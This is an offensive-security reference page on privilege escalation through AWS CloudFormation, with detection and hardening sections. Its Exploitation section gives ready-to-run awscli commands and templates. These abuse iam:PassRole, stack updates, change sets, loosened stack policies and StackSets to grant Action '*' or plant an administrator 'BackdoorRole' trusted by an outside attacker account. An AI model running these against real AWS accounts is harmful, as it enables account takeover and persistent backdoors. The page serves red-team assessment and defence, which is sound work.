---
cstg_id: CSTG-AWS-CLOUDFORMATION-PRIVESC
title: "AWS Cloudformation - Privilege Escalation"
provider: aws
service: cloudformation
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - cloudformation:CreateStack
  - cloudformation:UpdateStack
  - cloudformation:CreateChangeSet
  - cloudformation:ExecuteChangeSet
  - cloudformation:SetStackPolicy
  - cloudformation:CreateStackSet
  - cloudformation:CreateStackInstances
  - iam:PassRole
tools:
  - awscli
  - pacu
  - cloudfox
references:
  - "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-iam-servicerole.html"
  - "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/control-access-with-iam.html"
  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
  - "https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/"
  - "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
  - "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/stacksets-prereqs-self-managed.html"
license: CC BY-SA 4.0
---

## Summary

CloudFormation is a deployment engine that creates real resources on the caller's behalf. Two distinct facts make it a potent privilege-escalation vector:

1. **CloudFormation can create or modify any resource type, including IAM.** If a principal can create or update a stack whose template declares IAM roles, policies, users, or access keys, that principal can mint privileges far beyond what their own identity policy grants directly.
2. **CloudFormation can act with a service role (`RoleARN`).** When a stack is given a service role, all resource operations are performed using **that role's** permissions, not the caller's. A low-privileged principal who can `iam:PassRole` a powerful service role to CloudFormation effectively borrows that role's permissions to do anything the role can do.

The attacker objective in this phase is to convert constrained stack-operation permissions into broad account control — typically by deploying or amending a template that grants the attacker an administrator role/user, or by passing a privileged service role to CloudFormation and using it as a deputy.

This page enumerates the escalation paths one permission (or small set) at a time. Each `###` subsection is a self-contained primitive. Combine with the inventory from [CloudFormation Enumeration](../02-services/aws-cloudformation-enum.md) to find which service roles and stacks are available to abuse.

## Prerequisites

This page assumes a foothold (assumed breach) with valid credentials in the target account. The specific permissions required vary per path and are stated in each subsection. The recurring prerequisites are:

- The ability to create a stack, update a stack, or create/execute a change set.
- For service-role abuse: `iam:PassRole` permission on a role that trusts `cloudformation.amazonaws.com` (or no service role is required, in which case CloudFormation uses the **caller's** permissions — meaning the caller themselves must hold the target permissions, which is the less interesting case).
- For IAM-creating templates: CloudFormation requires the caller to acknowledge `CAPABILITY_IAM` or `CAPABILITY_NAMED_IAM`; for macro/nested expansion, `CAPABILITY_AUTO_EXPAND`.

Confirm the current identity and reachable roles first:

```bash
aws sts get-caller-identity
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument, `cloudformation`)].[RoleName,Arn]' --output text
```

## Enumeration

Identify the levers before pulling them:

```bash
# Which roles can be passed to CloudFormation? Inspect trust policies for the CFN service principal.
aws iam list-roles --output json \
  | jq -r '.Roles[] | select(.AssumeRolePolicyDocument | tostring | test("cloudformation.amazonaws.com")) | [.RoleName,.Arn] | @tsv'

# What can a candidate service role do? (the borrowed permission set)
aws iam list-attached-role-policies --role-name <cfn-service-role>
aws iam list-role-policies --role-name <cfn-service-role>

# Existing stacks you may be able to UPDATE, and the role they already use
aws cloudformation describe-stacks \
  --query 'Stacks[].{Name:StackName,Role:RoleARN,Status:StackStatus}' --output table

# Confirm your own stack-operation permissions
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
  --action-names cloudformation:CreateStack cloudformation:UpdateStack iam:PassRole \
  --output table 2>/dev/null
```

## Misconfigurations & Findings

- **`iam:PassRole` scoped to `*`** combined with any stack-operation permission lets the caller pass an administrator service role to CloudFormation.
- **A shared, over-privileged service role** (e.g., one with `AdministratorAccess` trusted by `cloudformation.amazonaws.com`) is the single most common enabler.
- **`CreateStack`/`UpdateStack` granted without restricting `RoleARN`** via an `iam:PassedToService` / role-ARN condition.
- **`UpdateStack` on a stack that already has a powerful `RoleARN`** — the caller may not even need `iam:PassRole`, because the role is already attached to the stack and CloudFormation reuses it on update.
- **`CreateChangeSet` + `ExecuteChangeSet`** treated as lower-risk than `UpdateStack`, yet equivalent in effect.
- **No template/resource-type guardrails** (no SCP, no `cloudformation:ResourceTypes` condition), so IAM resources can be declared freely.

## Exploitation

### iam:PassRole

`iam:PassRole` on a role that CloudFormation can assume is the core primitive. The caller does not need the role's permissions themselves — they delegate the work to CloudFormation, which uses the role.

Find a passable, powerful role (trust policy includes `cloudformation.amazonaws.com`), then create a stack that uses it as the service role to perform a privileged action — e.g., attaching `AdministratorAccess` to an attacker-controlled user:

```yaml
# escalate.yaml
Resources:
  GrantAdmin:
    Type: AWS::IAM::ManagedPolicy
    Properties:
      ManagedPolicyName: cfn-helper-policy
      Users: [ attacker-user ]
      PolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Action: '*'
            Resource: '*'
```

```bash
aws cloudformation create-stack \
  --stack-name maint-task \
  --template-body file://escalate.yaml \
  --role-arn arn:aws:iam::111122223333:role/PowerfulCfnServiceRole \
  --capabilities CAPABILITY_NAMED_IAM
```

CloudFormation assumes `PowerfulCfnServiceRole` and executes the IAM change. The escalation succeeds even though the caller has no `iam:*` permissions of their own — only `cloudformation:CreateStack` and `iam:PassRole`.

### cloudformation:CreateStack

With `CreateStack` and the ability to pass (or reuse) a service role that can create IAM resources, deploy a template that creates a new administrator role/user and access keys. Even without a service role, if the **caller's own** permissions allow IAM creation, `CreateStack` is just a wrapper to perform it.

A self-contained escalation creating a new role the attacker can assume:

```yaml
Resources:
  BackdoorRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: support-automation
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal: { AWS: 'arn:aws:iam::444455556666:root' }  # attacker account
            Action: 'sts:AssumeRole'
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess
```

```bash
aws cloudformation create-stack --stack-name support-automation \
  --template-body file://role.yaml \
  --role-arn arn:aws:iam::111122223333:role/PowerfulCfnServiceRole \
  --capabilities CAPABILITY_NAMED_IAM
```

### cloudformation:UpdateStack

`UpdateStack` is often the most dangerous, because an existing stack frequently already has a privileged `RoleARN` attached. CloudFormation reuses that role on update **without** the caller needing `iam:PassRole`. The attacker amends the existing template to add a malicious IAM resource:

```bash
# Pull the current template, append a backdoor IAM resource, then update in place.
aws cloudformation get-template --stack-name prod-iam \
  --query TemplateBody --output text > current.json
# (edit current.json to add an admin policy/role)
aws cloudformation update-stack --stack-name prod-iam \
  --template-body file://current.json \
  --capabilities CAPABILITY_NAMED_IAM
```

If `RoleARN` is already set on the stack, the existing service role performs the new IAM action. This effectively turns `UpdateStack` on a single privileged stack into account compromise.

### cloudformation:CreateChangeSet & cloudformation:ExecuteChangeSet

Change sets achieve the same outcome as `UpdateStack`/`CreateStack` but in two steps, and are sometimes overlooked by least-privilege policies that only deny `UpdateStack`. Create a change set that adds an IAM resource, then execute it:

```bash
aws cloudformation create-change-set \
  --stack-name prod-iam --change-set-name patch \
  --template-body file://current.json \
  --role-arn arn:aws:iam::111122223333:role/PowerfulCfnServiceRole \
  --capabilities CAPABILITY_NAMED_IAM --change-set-type UPDATE

aws cloudformation execute-change-set \
  --stack-name prod-iam --change-set-name patch
```

### cloudformation:SetStackPolicy

A stack policy can block updates to specific resources. A caller with `SetStackPolicy` can **loosen** an otherwise protective stack policy (set it to allow all updates) so that a subsequent `UpdateStack` can modify previously protected IAM or security resources:

```bash
aws cloudformation set-stack-policy --stack-name prod-iam \
  --stack-policy-body '{"Statement":[{"Effect":"Allow","Action":"Update:*","Principal":"*","Resource":"*"}]}'
```

This is an enabler that pairs with `UpdateStack`/`ExecuteChangeSet` rather than a standalone escalation.

### cloudformation:CreateStackSet & cloudformation:CreateStackInstances

StackSets deploy a template across many accounts and regions using an **execution role** in each target account. A caller who can create a stack set and instances, and pass the administration role, can push an IAM-creating template into every target account — escalating laterally and across the AWS Organization:

```bash
aws cloudformation create-stack-set --stack-set-name org-helper \
  --template-body file://role.yaml \
  --capabilities CAPABILITY_NAMED_IAM \
  --permission-model SELF_MANAGED \
  --administration-role-arn arn:aws:iam::111122223333:role/AWSCloudFormationStackSetAdministrationRole \
  --execution-role-name AWSCloudFormationStackSetExecutionRole

aws cloudformation create-stack-instances --stack-set-name org-helper \
  --accounts 222233334444 555566667777 --regions us-east-1
```

If the execution role in target accounts carries broad permissions (a frequent default), the attacker obtains administrator-equivalent access in each targeted account.

## Detection & Logging

CloudFormation operations are logged to **CloudTrail** under `cloudformation.amazonaws.com`. The escalation-relevant write events are `CreateStack`, `UpdateStack`, `CreateChangeSet`, `ExecuteChangeSet`, `SetStackPolicy`, `CreateStackSet`, and `CreateStackInstances`. Critically, the **downstream IAM changes** are logged separately under `iam.amazonaws.com` with the **service role** as the `userIdentity` (a `userIdentity.type` of `AssumedRole` whose session belongs to the CloudFormation service role) — so the actor in the IAM event is the deploy role, not the human caller.

High-fidelity detections:

- A `CreateStack`/`UpdateStack`/`ExecuteChangeSet` event that includes `CAPABILITY_NAMED_IAM` or `CAPABILITY_IAM` in `requestParameters`, followed within seconds by `iam:CreateRole`, `iam:AttachRolePolicy`, `iam:CreateUser`, `iam:CreateAccessKey`, or `iam:PutUserPolicy` attributed to a CloudFormation service role.
- `iam:PassRole` events where `requestParameters.roleArn` is a high-privilege role and the related call is a CloudFormation action.
- `SetStackPolicy` that replaces a restrictive policy with an allow-all policy, immediately preceding an `UpdateStack`.
- `CreateStackInstances` targeting accounts/regions outside the normal deployment footprint.
- Correlate the human principal (`sourceIPAddress`, `userAgent`) of the CloudFormation call with the service-role identity of the resulting IAM mutations.

GuardDuty IAM finding types (e.g., anomalous IAM API usage) may fire on the resulting privilege grants if behavioral baselines exist.

## Remediation & Hardening

- **Constrain `iam:PassRole`.** Never grant `iam:PassRole` on `*`. Scope it to specific role ARNs and add an `iam:PassedToService` condition limiting which services (e.g., only when truly required for `cloudformation.amazonaws.com`).
- **Least-privilege service roles.** Each stack should use a dedicated service role scoped to exactly the resource types it manages. Do not trust `cloudformation.amazonaws.com` from an administrator role.
- **Require explicit service roles.** Use IAM conditions on `cloudformation:CreateStack`/`UpdateStack` to require a specific approved `RoleARN`, preventing callers from using their own broad permissions or arbitrary roles.
- **Restrict IAM-creating stacks.** Deny the IAM capabilities to most principals; reserve `CAPABILITY_NAMED_IAM`/`CAPABILITY_AUTO_EXPAND` to controlled pipelines. Consider an SCP denying `iam:*` except via approved automation.
- **Protect stacks with stack policies** and restrict `SetStackPolicy` so protective policies cannot be loosened.
- **Lock down StackSet roles.** Tightly scope `AWSCloudFormationStackSetExecutionRole` in member accounts and restrict who may create stack sets/instances; prefer `SERVICE_MANAGED` with explicit OU targeting.
- **Alert on the patterns above** and treat any CloudFormation operation that mutates IAM as a high-severity, reviewable event.

## Tools

- **awscli** — performs all stack, change-set, and StackSet operations used in these paths.
- **pacu** — includes CloudFormation-based privilege-escalation and `PassRole` discovery modules.
- **cloudfox** — enumerates `PassRole`-able roles and CloudFormation service roles during triage.

## References

- CloudFormation service roles — https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-iam-servicerole.html
- Controlling access with IAM for CloudFormation — https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/control-access-with-iam.html
- Rhino Security Labs — AWS privilege escalation methods and mitigation — https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- Rhino Security Labs — Cloud Malware: CloudFormation injection — https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/
- hackingthe.cloud — IAM privilege escalation — https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
- Self-managed StackSet permissions — https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/stacksets-prereqs-self-managed.html
